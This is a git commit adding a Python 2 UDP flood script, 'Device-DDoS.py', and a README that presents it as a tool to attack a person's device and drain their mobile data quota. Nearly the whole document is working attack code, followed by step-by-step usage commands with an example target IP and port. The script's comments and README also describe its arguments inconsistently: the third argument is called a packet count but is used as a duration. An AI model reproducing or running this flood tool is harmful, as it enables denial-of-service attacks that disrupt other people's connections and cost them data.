ee05210304e8b16f68f13592b706401dfeb1e9e1
kevlog <kevinkrisna27@gmail.com>
2023-01-02 00:51:49 +0700

    new file:   Device-DDoS.py 	new file:   README.md

---
+++ Device-DDoS.py
@@ -0,0 +1,33 @@
+import time
+import socket
+import random
+import sys
+def usage():
+    print "\033[1;94m#########################################################"
+    print "    \033[1;92mCommand: python2 LITEDDOS.py <ip> <port> <packet>    "
+    print "\033[1;94m#########################################################"
+def flood(victim, vport, duration):
+    # Create a server, when I call "SOCK_DGRAM" it shows UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 one byte representation to the server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91mStarting \033[1;32m%s \033[1;91msends \033[1;32m%s \033[1;91mpackets on port \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
---
+++ README.md
@@ -0,0 +1,27 @@
+# Device DDoS
+This DDoS tool serves to attack devices to receive packets. It allows someone to lose their internet quota, if this tool is used to attack their smartphone.
+
+This tool does not apply to webstie attacks.
+
+# Description
+This directory contains Device DDoS scripts that you can use in a Linux environment.
+
+## How to Use?
+1. $ ``git clone https://github.com/Kevlog/Device-DDoS``
+2. $ ``cd Device-DDoS``
+3. $ ``python2 Device-DDoS.py <ip> <port> <packet>``
+4. $ ``python2 Device-DDoS.py 192.168.0.0 80 100`` (example)
+
+The exemple is means that:
+- IP target: 192.168.0.0
+- port: 80
+- Total of packet:100
+
+### Suggestion for You
+You can add except with a display like this for example "Stopping Attack!".
+
+This is so that when the user closes the program (by pressing ctrl + c), the program can be closed neatly.
+
+I'm still learning a lot about python programming, this program is also a recode from the [RCode777](https://github.com/RCode777) account. That way I still have a lot to learn python programming.
+
+Alright, maybe that's enough. Thank you for your attention.
